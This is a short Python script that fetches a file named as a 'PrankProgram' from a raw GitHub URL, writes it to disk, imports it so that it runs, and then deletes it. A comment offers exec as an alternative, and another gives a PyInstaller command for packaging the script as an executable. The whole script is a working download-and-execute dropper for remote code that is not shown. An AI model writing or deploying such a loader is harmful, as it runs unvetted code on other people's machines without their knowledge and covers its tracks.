
import requests, os


# downloads raw git file as text and execute
try:
    file_text = requests.get("https://raw.githubusercontent.com/GummyC/PrankProgram/refs/heads/main/main.py").text
      
    with open("script.py","w") as s:
        s.write(file_text)
    
    import script


    os.remove("script.py")
    # exec(file_text, {'__name__': '__main__'})
except Exception as e:
    print(e)

# py -m PyInstaller myfile.py